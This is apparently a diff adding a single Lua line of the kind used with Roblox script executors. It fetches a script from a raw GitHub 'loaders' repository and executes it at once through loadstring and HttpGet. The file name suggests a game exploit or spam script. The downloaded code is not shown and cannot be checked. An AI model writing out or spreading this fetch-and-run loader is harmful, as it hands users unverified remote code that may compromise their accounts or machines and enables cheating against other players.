@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/x5-exp-event-sans-aus-fighter-2-spam7-j3wphg9eo2u6pu.lua"))()
